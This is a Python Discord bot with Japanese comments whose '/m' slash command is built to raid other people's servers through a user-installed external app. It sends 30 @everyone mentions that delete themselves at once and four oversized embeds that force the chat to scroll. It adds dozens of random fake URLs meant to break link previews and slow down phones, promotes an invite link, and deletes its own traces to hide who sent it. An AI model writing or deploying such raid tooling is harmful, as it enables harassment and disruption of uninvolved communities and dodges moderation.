import os
import threading
from datetime import timedelta
import asyncio
import random
import string
import discord
from discord.ext import commands
from discord import app_commands
from flask import Flask

# --- 1. Flask（簡易Webサーバー）の設定 ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- 2. Discord Botの設定 ---
intents = discord.Intents.default()
intents.message_content = True 
bot = commands.Bot(command_prefix="!", intents=intents)

IGNORE_CHANNEL_IDS = [1555585863402913922]
IGNORE_GUILD_IDS = [1555584934951915706]

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Successfully synced {len(synced)} command(s).")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

def create_salmon_poll(question_text: str) -> discord.Poll:
    poll = discord.Poll(question=question_text, duration=timedelta(hours=1))
    poll.add_answer(text="さーもん万歳！(1)", emoji="💩")
    poll.add_answer(text="さーもん万歳！(2)", emoji="🐟")
    return poll

# 🔗 プレビュー破壊用のランダムURLを生成するヘルパー
def generate_heavy_urls(count: int) -> str:
    urls = []
    for _ in range(count):
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        urls.append(f"https://salmon-is-god-{rand_str}.com/chaos-preview-destruction")
    return "\n".join(urls)

# /m コマンド（他人のサーバー用：完全ステルス外部アプリ極限特化版）
@bot.tree.command(name="m", description="【最凶兵器】外部アプリとして、他人のサーバーに全ての破壊工作を確実に叩き込みます")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(text="投票のタイトルと一緒に送るメッセージ")
async def send_m(interaction: discord.Interaction, text: str = "さーもん万歳！"):
    
    if interaction.guild_id in IGNORE_GUILD_IDS or interaction.channel_id in IGNORE_CHANNEL_IDS:
        await interaction.response.send_message("⚠️ この場所でのコマンド使用は禁止されています。", ephemeral=True)
        return

    # 🥷 履歴を一切残さないエフェメラル保留
    # 他人の画面には、あなたがコマンドを実行した痕跡すら一瞬も表示されなくなります
    await interaction.response.defer(thinking=True, ephemeral=True)

    mention_setting = discord.AllowedMentions(everyone=True, users=True, roles=True)
    image_files = ["acc4d0a0.gif", "a62e0a5b.gif", "IMG_3948.png", "DSC_9262.png", "20260913_162130.png", "PXL_20261004_095516_336.png"]
    existing_files = [f for f in image_files if os.path.exists(f)]

    # 👻 【機能1】外部アプリ対応型・サイレントゴースト連打（30回）
    # 枠を奪い合わないように、完全に独立した超高速処理で通知の音だけを30回残します
    async def ghost_burst():
        for _ in range(30):
            try:
                ghost_msg = await interaction.followup.send(content="@everyone 🚨 さーもんの集い！！万歳！！ 🚨", allowed_mentions=mention_setting)
                await asyncio.sleep(0.05) # 0.05秒で即消去して残さない
                await ghost_msg.delete()
            except Exception:
                pass
            await asyncio.sleep(0.1)

    # ゴースト爆撃を非同期で最速スタート
    asyncio.create_task(ghost_burst())
    await asyncio.sleep(0.5) # ゴーストが少し先行するように僅かにウェイト

    # 💥 【機能2＆4】外部アプリの制限上限（4回分）を使って巨大Embedとプレビュー破壊を連射
    for i in range(4):
        try:
            # チャット欄を強制スクロールさせる縦長コードブロックと巨大文字
            giant_markdown = "# 🚨 サーモンの集い 🚨 今すぐ参加！！ https://discord.gg/efe5fsS2JA \n" + "```\n\n\n\n\n\n\n\n\n\n```\n" * 5
            # スマホを重くさせるプレビュー破壊偽装URL
            heavy_urls = generate_heavy_urls(30)

            embed = discord.Embed(
                title="🚨 さーもん！ 🚨 さーもん万歳！！！", 
                description=f"{giant_markdown}\n\n{heavy_urls}", 
                color=0xFF0033 # 最も目立つネオンレッド
            )
            
            files_obj = []
            if existing_files:
                chosen_image = existing_files[i % len(existing_files)]
                files_obj.append(discord.File(chosen_image, filename=chosen_image))
                embed.set_image(url=f"attachment://{chosen_image}")

            # 外部アプリの正規ルート（followup）で他人のサーバーに直接パイルバンカーを打ち込む
            await interaction.followup.send(
                content="@everyone 【サーモンの集い】さーもん万歳！ https://discord.gg/efe5fsS2JA", 
                embed=embed, 
                files=files_obj, 
                allowed_mentions=mention_setting
            )
            await asyncio.sleep(1.0)

        except Exception as e:
            print(f"メイン爆撃エラー (ループ {i+1}回目): {e}")

    # 👑 【機能3】最後に1回だけ公式投票を送信して枠を使い切る（合計5回）
    try:
        poll_obj = create_salmon_poll(text)
        await interaction.followup.send(poll=poll_obj)
    except Exception as poll_err:
        print(f"最終投票の送信失敗: {poll_err}")

    # 🧼 あなたの画面に残っている「Thinking...」の保留枠自体も綺麗に消去して完全隠滅
    try:
        await interaction.delete_original_response()
    except Exception:
        pass

# --- 3. 起動処理 ---
if __name__ == "__main__":
    web_thread = threading.Thread(target=run_web)
    web_thread.daemon = True
    web_thread.start()

    token = os.environ.get("DISCORD_TOKEN")
    bot.run(token)
